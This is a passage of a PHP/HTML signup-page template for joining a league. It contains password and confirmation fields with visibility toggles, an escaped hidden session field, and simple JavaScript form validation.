                                        <svg class="eye-closed" style="display:none" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/></svg>
                                    </button>
                                </div>
                            </div>
                            <div class="form-group">
                                <label class="form-label">Confirm Password <span class="required">*</span></label>
                                <div class="input-wrapper">
                                    <input type="password" class="form-input has-toggle" id="passwordrepeat" name="passwordrepeat" maxlength="10" placeholder="••••••••" required>
                                    <button type="button" class="pwd-toggle" onclick="togglePassword('passwordrepeat', this)" title="Show/hide password">
                                        <svg class="eye-open" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                                        <svg class="eye-closed" style="display:none" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/></svg>
                                    </button>
                                </div>
                            </div>
                        </div>

                        <!-- Hidden fields needed for logic -->
                        <input name="sid" type="hidden" value="<?= htmlspecialchars($sid) ?>">

                        <button type="submit" class="btn-primary" style="margin-top: 15px;">
                            Join League
                            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
                        </button>
                    </div>
                </form>
            <?php endif; ?>

            <div class="form-footer">
                Already have an account? <a href="/index.php">Login here</a>
            </div>
        </div>
    </div>
</div>

<script>
function togglePassword(inputId, btn) {
    var input = document.getElementById(inputId);
    var eyeOpen = btn.querySelector('.eye-open');
    var eyeClosed = btn.querySelector('.eye-closed');
    if (input.type === 'password') {
        input.type = 'text';
        eyeOpen.style.display = 'none';
        eyeClosed.style.display = 'block';
    } else {
        input.type = 'password';
        eyeOpen.style.display = 'block';
        eyeClosed.style.display = 'none';
    }
}

function updateFileLabel(input) {
    var label = document.getElementById('fileLabel');
    if (input.files && input.files[0]) {
        label.querySelector('span').textContent = input.files[0].name;
        label.style.borderColor = 'rgba(129, 140, 248, 0.4)';
        label.style.color = '#A5B4FC';
    }
}

function validateProfile() {
    var name = document.getElementById('name').value.trim();
    var pwd = document.getElementById('password').value;
    var pwd2 = document.getElementById('passwordrepeat').value;

    if (name === '') { alert('Please enter a nickname.'); return false; }
    if (pwd === '') { alert('Please enter a password.'); return false; }
    if (pwd !== pwd2) { alert('Passwords do not match.'); return false; }
    if (pwd.length < 3) { alert('Password must be at least 3 characters.'); return false; }
    return true;
}
</script>

</body>
</html>
